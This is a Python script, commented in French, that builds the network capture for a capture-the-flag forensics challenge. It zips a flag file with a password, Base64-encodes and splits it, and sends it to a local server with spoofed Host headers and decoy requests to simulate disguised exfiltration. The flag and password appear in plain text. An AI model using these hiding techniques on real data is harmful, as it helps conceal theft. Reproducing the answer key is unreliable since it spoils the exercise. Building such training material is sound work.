#!/usr/bin/env python3
# build.py - genere le trafic reseau du challenge, a enregistrer avec tcpdump.
#
# A lancer dans 3 terminaux (depuis ce dossier) :
#   T1 : python3 server.py
#   T2 : sudo tcpdump -i lo -w capture.pcap port 8080
#   T3 : python3 build.py
# Puis Ctrl+C sur T2 et : mv capture.pcap src/public/capture.pcap
#
# Ce que fait le script :
#   1. ecrit le document a exfiltrer (il contient le flag) ;
#   2. le met dans une archive ZIP protegee par mot de passe ;
#   3. encode l'archive en Base64 et la coupe en deux morceaux ;
#   4. envoie le tout au "service de depot", en imitant plusieurs sites de l'ESD.

import base64, os, subprocess, http.client, shutil

MOT_DE_PASSE = "Exam3n_Blanc_NESD_006"

# On a besoin de l'outil "zip" pour creer l'archive protegee par mot de passe.
if shutil.which("zip") is None:
    raise SystemExit("Erreur : l'outil 'zip' est manquant. Installez-le avec : sudo apt install zip")

# 1) Le document a exfiltrer (avec le flag)
with open("corrige_examen.txt", "w") as f:
    f.write("Corrige examen blanc - ESD Academy (promo NESD_006)\n")
    f.write("Reponses exfiltrees depuis le dashboard stagiaire\n")
    f.write("Flag : ESD{Antis3ch3_Du_S0C_ESD}\n")

# 2) On le met dans une archive ZIP protegee par mot de passe
if os.path.exists("corrige.zip"):
    os.remove("corrige.zip")
subprocess.run(["zip", "-P", MOT_DE_PASSE, "corrige.zip", "corrige_examen.txt"],
               check=True, stdout=subprocess.DEVNULL)

# 3) On encode l'archive en Base64, puis on la coupe en deux morceaux
archive_base64 = base64.b64encode(open("corrige.zip", "rb").read()).decode()
moitie = len(archive_base64) // 2
morceau_1 = archive_base64[:moitie]
morceau_2 = archive_base64[moitie:]

# La cle de l'archive est aussi envoyee, encodee en Base64
cle_base64 = base64.b64encode(MOT_DE_PASSE.encode()).decode()

# 4) Petite fonction pour envoyer une requete en imitant un site de l'ESD
def envoyer(hote, methode, chemin, corps="", entete_extra=None):
    corps = corps.encode()
    connexion = http.client.HTTPConnection("127.0.0.1", 8080)
    connexion.putrequest(methode, chemin, skip_host=True, skip_accept_encoding=True)
    connexion.putheader("Host", hote)          # nom de site "imite"
    connexion.putheader("User-Agent", "curl/8.5.0")
    connexion.putheader("Accept", "*/*")
    if entete_extra:
        connexion.putheader(*entete_extra)
    connexion.putheader("Content-Length", str(len(corps)))
    connexion.endheaders()
    connexion.send(corps)
    connexion.getresponse().read()
    connexion.close()

# 5) On genere le trafic : quelques echanges anodins + l'exfiltration
envoyer("dashboard.esdacademy.eu:8080", "GET", "/")                                  # anodin
envoyer("forum.esdacademy.eu:8080", "POST", "/message", "auteur=stagiaire&msg=rdv")  # leurre
envoyer("depot.esdacademy.eu:8080", "POST", "/api/upload", "auteur=stagiaire&action=init",
        entete_extra=("X-Upload-Key", cle_base64))                                   # porte la cle
envoyer("ent.esdacademy.eu:8080", "GET", "/")                                        # anodin
envoyer("depot.esdacademy.eu:8080", "POST", "/upload/1", morceau_1)                  # 1er morceau
envoyer("depot.esdacademy.eu:8080", "POST", "/upload/2", morceau_2)                  # 2e morceau

# 6) Nettoyage des fichiers temporaires
os.remove("corrige_examen.txt")
os.remove("corrige.zip")
print("Trafic genere. Arretez tcpdump puis : mv capture.pcap src/public/capture.pcap")
